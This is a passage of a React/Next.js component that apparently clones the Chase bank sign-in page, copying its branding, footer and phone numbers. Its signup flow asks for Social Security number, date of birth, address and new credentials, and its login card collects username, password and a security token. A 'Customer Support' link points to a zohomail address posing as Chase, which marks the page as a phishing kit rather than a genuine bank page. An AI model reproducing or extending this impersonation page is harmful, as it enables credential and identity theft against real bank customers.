                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Social Security Number *</label>
                      <input
                        type="password"
                        value={signupData.ssn}
                        onChange={(e) => setSignupData({ ...signupData, ssn: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        placeholder="***-**-****"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Date of Birth *</label>
                      <input
                        type="date"
                        value={signupData.dob}
                        onChange={(e) => setSignupData({ ...signupData, dob: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Street Address *</label>
                      <input
                        type="text"
                        value={signupData.address}
                        onChange={(e) => setSignupData({ ...signupData, address: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
                        <input
                          type="text"
                          value={signupData.city}
                          onChange={(e) => setSignupData({ ...signupData, city: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-1">State</label>
                        <input
                          type="text"
                          value={signupData.state}
                          onChange={(e) => setSignupData({ ...signupData, state: e.target.value })}
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                        />
                      </div>
                    </div>
                  </div>
                </>
              )}

              {signupStep === 3 && (
                <>
                  <h2 className="text-xl font-bold text-gray-900 mb-4">Create Credentials</h2>
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Username *</label>
                      <input
                        type="text"
                        value={signupData.username}
                        onChange={(e) => setSignupData({ ...signupData, username: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Password *</label>
                      <input
                        type="password"
                        value={signupData.password}
                        onChange={(e) => setSignupData({ ...signupData, password: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                      <div className="mt-2 p-2 bg-gray-50 rounded text-xs">
                        <ul className="space-y-1">
                          <li className={signupData.password.length >= 8 ? "text-green-600" : "text-gray-500"}>
                            {signupData.password.length >= 8 ? "✓" : "○"} At least 8 characters
                          </li>
                          <li className={/[A-Z]/.test(signupData.password) ? "text-green-600" : "text-gray-500"}>
                            {/[A-Z]/.test(signupData.password) ? "✓" : "○"} One uppercase letter
                          </li>
                          <li className={/[a-z]/.test(signupData.password) ? "text-green-600" : "text-gray-500"}>
                            {/[a-z]/.test(signupData.password) ? "✓" : "○"} One lowercase letter
                          </li>
                          <li className={/\d/.test(signupData.password) ? "text-green-600" : "text-gray-500"}>
                            {/\d/.test(signupData.password) ? "✓" : "○"} One number
                          </li>
                        </ul>
                      </div>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-1">Confirm Password *</label>
                      <input
                        type="password"
                        value={signupData.confirmPassword}
                        onChange={(e) => setSignupData({ ...signupData, confirmPassword: e.target.value })}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca]"
                      />
                      {signupData.confirmPassword && signupData.password !== signupData.confirmPassword && (
                        <p className="text-red-500 text-xs mt-1">Passwords do not match</p>
                      )}
                    </div>
                    <div className="space-y-3 pt-2">
                      <label className="flex items-start gap-3 cursor-pointer">
                        <Checkbox
                          checked={signupData.agreeTerms}
                          onCheckedChange={(checked) =>
                            setSignupData({ ...signupData, agreeTerms: checked as boolean })
                          }
                          className="mt-0.5"
                        />
                        <span className="text-sm text-gray-600">
                          I agree to the{" "}
                          <a href="#" className="text-[#117aca] hover:underline">
                            Terms of Service
                          </a>{" "}
                          and{" "}
                          <a href="#" className="text-[#117aca] hover:underline">
                            Privacy Policy
                          </a>
                        </span>
                      </label>
                      <label className="flex items-start gap-3 cursor-pointer">
                        <Checkbox
                          checked={signupData.agreeElectronic}
                          onCheckedChange={(checked) =>
                            setSignupData({ ...signupData, agreeElectronic: checked as boolean })
                          }
                          className="mt-0.5"
                        />
                        <span className="text-sm text-gray-600">
                          I agree to receive electronic communications from Chase
                        </span>
                      </label>
                    </div>
                  </div>
                </>
              )}

              <Button
                onClick={handleSignupSubmit}
                disabled={isLoading}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6 mt-6"
              >
                {isLoading ? "Processing..." : signupStep === 3 ? "Create Account" : "Continue"}
              </Button>
            </div>
          )}

          {/* Open Account Modal */}
          {modalView === "open-account" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Open a Chase Account</h2>
              <p className="text-gray-600 mb-6">Choose the account that's right for you.</p>

              <div className="space-y-3">
                <button
                  onClick={() => setModalView("account-type")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                      <Building2 className="w-6 h-6 text-[#117aca]" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Checking Account</p>
                      <p className="text-sm text-gray-500">Chase Total Checking - $0 deposit to open</p>
                    </div>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("account-type")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                      <Shield className="w-6 h-6 text-green-600" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Savings Account</p>
                      <p className="text-sm text-gray-500">Chase Savings - Earn interest on your balance</p>
                    </div>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("account-type")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                      <CreditCard className="w-6 h-6 text-[#117aca]" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Credit Card</p>
                      <p className="text-sm text-gray-500">Chase Freedom, Sapphire, and more</p>
                    </div>
                  </div>
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/personal/investments", "_blank")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all text-left"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center">
                      <ExternalLink className="w-6 h-6 text-orange-600" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-900">Investment Account</p>
                      <p className="text-sm text-gray-500">Self-Directed Investing & more</p>
                    </div>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-gray-50 rounded-xl">
                <p className="text-xs text-gray-600">
                  <strong>Need help choosing?</strong> Call us at 1-800-935-9935 or visit a Chase branch near you.
                </p>
              </div>
            </div>
          )}

          {/* Account Type Details */}
          {modalView === "account-type" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">Chase Total Checking</h2>

              <div className="bg-gradient-to-r from-[#117aca] to-[#0a5a9e] text-white p-6 rounded-xl mb-6">
                <p className="text-3xl font-bold">$300</p>
                <p className="text-sm opacity-90">New account bonus when you set up direct deposit</p>
              </div>

              <div className="space-y-4 mb-6">
                <h3 className="font-semibold text-gray-900">Account Benefits</h3>
                <ul className="space-y-3">
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">Access to 15,000+ Chase ATMs and 4,700+ branches</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">Chase Mobile app with mobile check deposit</span>
                  </li>
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">
                      Zero Liability Protection on unauthorized transactions
                    </span>
                  </li>
                  <li className="flex items-start gap-3">
                    <Check className="w-5 h-5 text-green-600 mt-0.5" />
                    <span className="text-sm text-gray-600">Send money with Zelle</span>
                  </li>
                </ul>
              </div>

              <div className="p-4 bg-yellow-50 border border-yellow-200 rounded-xl mb-6">
                <div className="flex items-start gap-3">
                  <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Monthly Service Fee</p>
                    <p className="text-xs text-gray-600">
                      $12/month. Easily waived with direct deposit of $500+ or $1,500+ daily balance.
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={() => window.open("https://accounts.chase.com/consumer/banking/online", "_blank")}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
              >
                <ExternalLink className="w-4 h-4 mr-2" />
                Open Account on Chase.com
              </Button>

              <p className="text-xs text-center text-gray-500 mt-4">
                You will be redirected to the official Chase website to complete your application.
              </p>
            </div>
          )}

          {/* Privacy Modal */}
          {modalView === "privacy" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">Privacy & Security</h2>

              <div className="space-y-4">
                <button
                  onClick={() => window.open("https://www.chase.com/digital/resources/privacy-security", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Shield className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Privacy Policy</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() =>
                    window.open("https://www.chase.com/digital/resources/privacy-security/security", "_blank")
                  }
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Lock className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Security Center</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() =>
                    window.open(
                      "https://www.chase.com/digital/resources/privacy-security/privacy/online-privacy-policy",
                      "_blank",
                    )
                  }
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <User className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Online Privacy Policy</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>
              </div>

              <div className="mt-6 p-4 bg-blue-50 rounded-xl">
                <h3 className="font-semibold text-gray-900 mb-2">Your Security Matters</h3>
                <ul className="text-sm text-gray-600 space-y-2">
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>256-bit encryption protects your data</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>Multi-factor authentication available</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>Real-time fraud monitoring</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="w-4 h-4 text-green-600 mt-0.5" />
                    <span>Zero Liability Protection</span>
                  </li>
                </ul>
              </div>

              <div className="mt-4 p-4 bg-gray-50 rounded-xl">
                <p className="text-xs text-gray-600">
                  <strong>Report suspicious activity:</strong> Call 1-800-935-9935 or visit chase.com/reportfraud
                </p>
              </div>
            </div>
          )}

          {/* More Options Modal */}
          {modalView === "more-options" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-4">More Options</h2>

              <div className="space-y-3">
                <button
                  onClick={() => window.open("https://locator.chase.com/", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Building2 className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Find a Branch or ATM</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/personal/credit-cards", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <CreditCard className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Credit Cards</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/personal/mortgage", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <HomeIcon className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Home Loans</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("https://www.chase.com/business", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Building2 className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Business Banking</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>

                <button
                  onClick={() => window.open("mailto:chase.org_info247@zohomail.com", "_blank")}
                  className="w-full p-4 border border-gray-200 rounded-xl hover:bg-gray-50 transition-all flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <Mail className="w-5 h-5 text-[#117aca]" />
                    <span className="font-medium text-gray-900">Customer Support</span>
                  </div>
                  <ExternalLink className="w-4 h-4 text-gray-400" />
                </button>
              </div>

              <div className="mt-6 p-4 bg-gray-50 rounded-xl text-center">
                <p className="text-sm text-gray-600 mb-2">Need help?</p>
                <p className="text-[#117aca] font-semibold">1-800-935-9935</p>
                <p className="text-xs text-gray-500 mt-1">Available 24/7</p>
              </div>
            </div>
          )}
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#117aca] flex flex-col">
      {/* Header with CHASE logo */}
      <div className="py-8 flex justify-center items-center">
        <div className="flex items-center gap-2">
          <span className="text-white text-2xl font-bold tracking-wide">CHASE</span>
          <Image src="/images/chase-logo.png" alt="Chase" width={36} height={36} className="rounded" />
        </div>
      </div>

      {/* Main Content - Login Card */}
      <div className="flex-1 flex flex-col justify-center px-4 pb-4">
        <div className="bg-white rounded-xl shadow-lg mx-auto w-full max-w-sm px-6 py-8">
          {/* Error Message */}
          {error && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-red-600 text-sm">{error}</p>
            </div>
          )}

          {/* Username Field - underline style */}
          <div className="mb-6">
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              onKeyPress={handleKeyPress}
              className="w-full border-b border-gray-300 py-3 px-0 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-500"
              placeholder="Enter your username"
              autoComplete="username"
            />
          </div>

          {/* Password Field - underline style */}
          <div className="mb-6">
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={handleKeyPress}
                className="w-full border-b border-gray-300 py-3 px-0 pr-10 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-500"
                placeholder="Enter your password"
                autoComplete="current-password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {useToken && (
            <div className="mb-6">
              <div className="relative">
                <input
                  type="text"
                  maxLength={6}
                  value={tokenCode}
                  onChange={(e) => setTokenCode(e.target.value.replace(/\D/g, ""))}
                  onKeyPress={handleKeyPress}
                  className="w-full border-b border-gray-300 py-3 px-0 pr-10 text-gray-900 focus:outline-none focus:border-[#117aca] transition-colors bg-transparent placeholder-gray-500 text-center tracking-widest"
                  placeholder="Enter security token"
                />
                <button
                  type="button"
                  onClick={() => setModalView("token-setup")}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-[#117aca] hover:text-[#0a5a9e]"
                >
                  <Key className="w-5 h-5" />
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-1 text-center">
                <button onClick={() => setModalView("token-setup")} className="text-[#117aca] hover:underline">
                  Generate a token
                </button>
              </p>
            </div>
          )}

          {/* Checkboxes - Remember me and Use token */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-2">
              <Checkbox
                id="remember"
                checked={rememberMe}
                onCheckedChange={(checked) => setRememberMe(checked as boolean)}
                className="border-[#117aca] data-[state=checked]:bg-[#117aca] data-[state=checked]:border-[#117aca]"
              />
              <label htmlFor="remember" className="text-sm text-gray-600 cursor-pointer">
                Remember me
              </label>
            </div>
            <div className="flex items-center gap-2">
              <Checkbox
                id="token"
                checked={useToken}
                onCheckedChange={(checked) => {
                  setUseToken(checked as boolean)
                  if (checked && !generatedToken) {
                    setModalView("token-setup")
                  }
                }}
                className="border-gray-400"
              />
              <label htmlFor="token" className="text-sm text-gray-600 cursor-pointer">
                Use token
              </label>
            </div>
          </div>

          {/* Sign In Button */}
          <Button
            onClick={handleSignIn}
            disabled={isLoading}
            className="w-full bg-[#117aca] hover:bg-[#0a5a9e] text-white py-6 rounded-md text-base font-medium transition-colors border-2 border-[#117aca]"
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>Signing in...</span>
              </div>
            ) : (
              "Sign in"
            )}
          </Button>

          {/* Forgot username or password link */}
          <div className="text-center mt-6">
            <button onClick={() => setModalView("forgot")} className="text-[#117aca] hover:underline text-sm">
              Forgot username or password?
            </button>
          </div>
        </div>

        <div className="flex items-center justify-center gap-3 mt-6 text-sm">
          <button onClick={() => setModalView("signup")} className="text-white hover:underline">
            Sign up
          </button>
          <span className="text-white">|</span>
          <button onClick={() => setModalView("open-account")} className="text-white hover:underline">
            Open an account
          </button>
          <span className="text-white">|</span>
          <button onClick={() => setModalView("privacy")} className="text-white hover:underline">
            Privacy
          </button>
          <span className="text-white">|</span>
          <button onClick={() => setModalView("more-options")} className="text-white font-bold hover:underline">
            •••
          </button>
        </div>
      </div>

      {/* Footer - Equal Housing Lender, FDIC, Copyright - Updated year to 2025 */}
      <div className="pb-6 pt-4 text-center space-y-2 px-4">
        <div className="flex items-center justify-center gap-1 text-xs text-white/80">
          <HomeIcon className="w-4 h-4" />
          <span>Equal Housing Lender</span>
        </div>
        <p className="text-xs text-white/80 leading-relaxed">
          Deposit products provided by JPMorgan Chase Bank, N.A.
          <br />
          Member FDIC
        </p>
        <p className="text-xs text-white/80 leading-relaxed">
          Credit cards are issued by JPMorgan Chase Bank, N.A.
          <br />
          Member FDIC
        </p>
        <p className="text-xs text-white/80 mt-2">© 2025 JPMorgan Chase & Co.</p>
      </div>

      {renderModal()}
    </div>
  )
}
